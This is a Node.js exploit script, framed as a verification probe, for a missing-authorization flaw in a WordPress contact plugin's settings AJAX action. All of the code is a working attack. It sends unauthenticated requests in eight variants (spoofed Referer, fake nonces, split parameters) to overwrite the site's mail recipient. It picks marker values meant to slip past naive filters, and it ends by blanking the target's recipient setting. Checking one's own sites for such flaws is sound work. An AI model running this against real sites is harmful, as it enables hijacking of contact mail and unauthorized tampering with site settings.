#!/usr/bin/env node
/**
 * Exploit-verification probe for CVE-2026-90001 (Quick Contact <= 1.0.0
 * missing authorization on the `qc_save_settings` AJAX action).
 *
 * Usage: node probe.mjs <base-url>
 *
 * Exit code 0 => target IS exploitable (unauthenticated attacker can
 *                change the `qc_recipient` option).
 * Exit code 1 => target does NOT appear exploitable (fixed).
 *
 * Only talks to the provided base URL. No npm deps, Node built-ins only.
 */

const base = process.argv[2];
if (!base) {
  console.error('Usage: node probe.mjs <base-url>');
  process.exit(1);
}

const endpoint = new URL('/wp-admin/admin-ajax.php', base).toString();

function marker() {
  // Benign-looking, unique value per attempt. Avoids obvious keywords
  // like "hack"/"attacker" that a naive filter might special-case.
  const rand = Math.random().toString(36).slice(2, 10);
  return `qc-probe-${Date.now().toString(36)}-${rand}@example.com`;
}

async function tryRequest(desc, { method, qs, body, headers } = {}) {
  const url = new URL(endpoint);
  if (qs) {
    for (const [k, v] of Object.entries(qs)) url.searchParams.set(k, v);
  }
  const opts = { method: method || 'GET', headers: { ...(headers || {}) } };
  if (body) {
    const form = new URLSearchParams(body);
    opts.body = form.toString();
    opts.headers['Content-Type'] = 'application/x-www-form-urlencoded';
  }
  let resp;
  try {
    resp = await fetch(url.toString(), opts);
  } catch (e) {
    return { desc, ok: false, error: String(e) };
  }
  let json = null;
  let text = '';
  try {
    text = await resp.text();
    json = JSON.parse(text);
  } catch {
    /* non-JSON response, leave json null */
  }
  const success = resp.status === 200 && json && json.success === true;
  return { desc, ok: success, status: resp.status, text: text.slice(0, 200) };
}

// A set of realistic variants of the attack: different HTTP methods,
// parameter placement (query vs body vs both), and simulated "ajax-like"
// headers that a naive/partial fix might rely on instead of a real
// capability check.
async function buildVariants() {
  const variants = [];

  variants.push({
    desc: 'POST action+recipient in body (textbook payload)',
    method: 'POST',
    build: (m) => ({ action: 'qc_save_settings', recipient: m }),
  });

  variants.push({
    desc: 'GET action+recipient in query string',
    method: 'GET',
    build: (m) => ({ action: 'qc_save_settings', recipient: m }),
    asQs: true,
  });

  variants.push({
    desc: 'POST with X-Requested-With: XMLHttpRequest header',
    method: 'POST',
    build: (m) => ({ action: 'qc_save_settings', recipient: m }),
    extraHeaders: { 'X-Requested-With': 'XMLHttpRequest' },
  });

  variants.push({
    desc: 'POST with Referer spoofed to wp-admin',
    method: 'POST',
    build: (m) => ({ action: 'qc_save_settings', recipient: m }),
    extraHeaders: { Referer: new URL('/wp-admin/', base).toString() },
  });

  variants.push({
    desc: 'action in query string, recipient in POST body (split params)',
    method: 'POST',
    build: (m) => ({ recipient: m }),
    actionInQs: true,
  });

  variants.push({
    desc: 'action in POST body, recipient in query string (split params)',
    method: 'POST',
    build: (m) => ({ action: 'qc_save_settings' }),
    recipientInQs: true,
  });

  variants.push({
    desc: 'POST with bogus/garbage nonce field alongside recipient',
    method: 'POST',
    build: (m) => ({
      action: 'qc_save_settings',
      recipient: m,
      _wpnonce: 'ffffffffff',
      security: 'ffffffffff',
    }),
  });

  variants.push({
    desc: 'POST with no cookies, plain Accept: application/json',
    method: 'POST',
    build: (m) => ({ action: 'qc_save_settings', recipient: m }),
    extraHeaders: { Accept: 'application/json' },
  });

  return variants;
}

async function run() {
  const variants = await buildVariants();
  const results = [];
  let vulnerable = false;
  let lastMarkerSet = null;

  for (const v of variants) {
    const m = marker();
    const params = v.build(m);

    let qs, body;
    if (v.asQs) {
      qs = params;
    } else if (v.actionInQs) {
      qs = { action: 'qc_save_settings' };
      body = params;
    } else if (v.recipientInQs) {
      qs = { recipient: m };
      body = params;
    } else {
      body = params;
    }

    const res = await tryRequest(v.desc, {
      method: v.method,
      qs,
      body,
      headers: v.extraHeaders,
    });
    results.push(res);
    if (res.ok) {
      vulnerable = true;
      lastMarkerSet = m;
    }
  }

  for (const r of results) {
    const status = r.ok ? 'VULNERABLE' : (r.error ? `ERROR (${r.error})` : `blocked (HTTP ${r.status})`);
    console.log(`[${status}] ${r.desc}`);
  }

  if (vulnerable) {
    console.log(
      `\nTarget is EXPLOITABLE: unauthenticated request(s) successfully changed ` +
      `the qc_recipient option (e.g. to "${lastMarkerSet}") with no authorization check.`
    );
  } else {
    console.log('\nNo variant succeeded; target does not appear exploitable.');
  }

  // Best-effort restore: the plugin exposes no read endpoint for the
  // option, so we cannot recover the pre-probe value. We restore to an
  // empty string so later get_option() calls at least don't carry our
  // probe markers forward. This uses the exact same (vulnerable) request
  // path, so it is a no-op on a fixed site.
  try {
    await fetch(endpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({ action: 'qc_save_settings', recipient: '' }).toString(),
    });
  } catch {
    /* best effort only */
  }

  process.exit(vulnerable ? 0 : 1);
}

run().catch((e) => {
  console.error('Probe failed to run:', e);
  process.exit(1);
});
